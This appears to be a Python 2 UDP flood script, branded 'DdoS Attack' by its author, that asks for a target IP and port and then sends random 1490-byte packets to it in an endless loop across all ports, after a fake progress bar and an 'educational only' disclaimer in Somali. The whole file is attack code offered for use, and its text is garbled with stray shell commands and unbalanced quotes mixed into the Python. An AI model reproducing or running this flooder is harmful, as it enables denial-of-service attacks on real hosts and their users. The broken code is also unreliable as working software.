print ("\033[91m")
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############
clear
mkdir Tools
clear 
echo -e '\033[31;40;1m 

██╗     ███████╗ █████╗ ██████╗ ███████╗██████╗     ██╗  ██╗██╗
██║     ██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗    ╚██╗██╔╝██║
██║     █████╗  ███████║██║  ██║█████╗  ██████╔╝     ╚███╔╝ ██║
██║     ██╔══╝  ██╔══██║██║  ██║██╔══╝  ██╔══██╗     ██╔██╗ ██║
███████╗███████╗██║  ██║██████╔╝███████╗██║  ██║    ██╔╝ ██╗██║
╚══════╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝
                                                               
  Coded By : Mr.XI
  Github   : github.com/LeaderXI"
  Telegram : https://telegram.me/F5_JUBA"
  FG- Qalabkani Waa Aalad Sharci Ah Waxaana Loogu Tala Galay Waxbarasho uun Kaliyah. Wixii Kaloo ka imaado Waa Madaxaaga!"
print
ip = raw_input("IP Target : ")
port = input("Port       : ")
os.system("clear")
print("\033[93m")
os.system("figlet DdoS Attack")
print("Team : LeaderXI")
print ("\033[92m")
print "[                    ] 0% "
time.sleep(5)
print "[=====               ] 25%"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

